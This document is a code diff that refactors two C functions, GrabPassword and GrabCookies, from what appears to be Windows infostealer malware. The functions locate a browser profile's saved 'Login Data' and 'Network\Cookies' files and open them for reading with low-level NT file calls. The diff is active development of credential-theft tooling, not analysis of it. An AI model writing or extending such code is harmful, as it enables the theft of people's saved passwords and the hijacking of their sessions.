@@ -5,7 +5,7 @@
 #include "../include/FileIO.h"
 
 
-void GrabPassword(unsigned short *BrowserPath, int BrowserPathLength) {
+void GrabPassword(unsigned short *BrowserPath) {
     HANDLE              FileHandle          = {0};
     UNICODE_STRING      PathUnicode         = {0};
     OBJECT_ATTRIBUTES   PathObj             = {0};
@@ -15,10 +15,11 @@ void GrabPassword(unsigned short *BrowserPath, int BrowserPathLength) {
     unsigned short      TempPath[250]       = {0};
     int                 FileSize            = 0;
     int                 FullBufferSize      = 0;
+    int                 PathSize            = lenW(BrowserPath);
 
     /*length * 2 because its wide character string*/
-    MovMemory(BrowserPath, TempPath, BrowserPathLength * 2);
-    ConcatStringW(TempPath, L"\\Default\\Login Data", BrowserPathLength);
+    MovMemory(BrowserPath, TempPath, PathSize * 2);
+    ConcatStringW(TempPath, L"\\Default\\Login Data", PathSize);
 
     InitPathObj(TempPath, &PathObj, &PathUnicode);
     InitFile(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, &IOstatus, FILE_OPEN);
@@ -38,7 +39,7 @@ void GrabPassword(unsigned short *BrowserPath, int BrowserPathLength) {
     }
 }
 
-void GrabCookies(unsigned short *BrowserPath, int BrowserPathLength) {
+void GrabCookies(unsigned short *BrowserPath) {
     UNICODE_STRING      PathUnicode         = {0};
     OBJECT_ATTRIBUTES   PathObj             = {0};
     IO_STATUS_BLOCK     IOstatus            = {0};
@@ -48,10 +49,11 @@ void GrabCookies(unsigned short *BrowserPath, int BrowserPathLength) {
     unsigned short      TempPath[250]       = {0};
     int                 FileSize            = 0;
     int                 FullBufferSize      = 0;
+    int                 PathSize            = lenW(BrowserPath);
 
     /*length * 2 because its wide character string*/
-    MovMemory(BrowserPath, TempPath, BrowserPathLength * 2);
-    ConcatStringW(TempPath, L"\\Default\\Network\\Cookies", BrowserPathLength);
+    MovMemory(BrowserPath, TempPath, PathSize * 2);
+    ConcatStringW(TempPath, L"\\Default\\Network\\Cookies", PathSize);
 
     InitPathObj(TempPath, &PathObj, &PathUnicode);
     InitFile(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, &IOstatus, FILE_OPEN);
